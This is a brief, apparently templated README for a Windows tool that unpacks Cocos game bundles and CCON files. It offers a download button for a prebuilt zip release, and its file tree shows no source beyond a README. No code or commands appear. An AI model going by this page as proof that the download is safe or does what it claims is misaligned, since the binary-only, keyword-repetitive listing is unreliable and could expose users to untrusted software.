...
<img src="preview.svg" alt="Cocos Bundle" width="100%"/>

# Cocos Bundle

**Cocos bundle / CCON unpacker — Windows desktop utility with batch export workflow**
...
**Cocos Bundle** is a Windows-focused desktop utility for **cocos bundle / ccon unpacker**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
[![Download](button.svg)](https://github.com/DestroyerPack/cocos-bundle-ccon-unpacker-tool/releases/download/v1.8.41/cocos-bundle-ccon-unpacker-tool-v1.8.41.zip)
...
```
cocos-bundle-ccon-unpacker-tool/
├── docs/
│   └── QUICKSTART.md
├── src/
│   └── README.md
...
<div align="center">
<sub>Windows · Game asset tooling · Open Source · cocos-bundle-ccon-unpacker</sub>
</div>
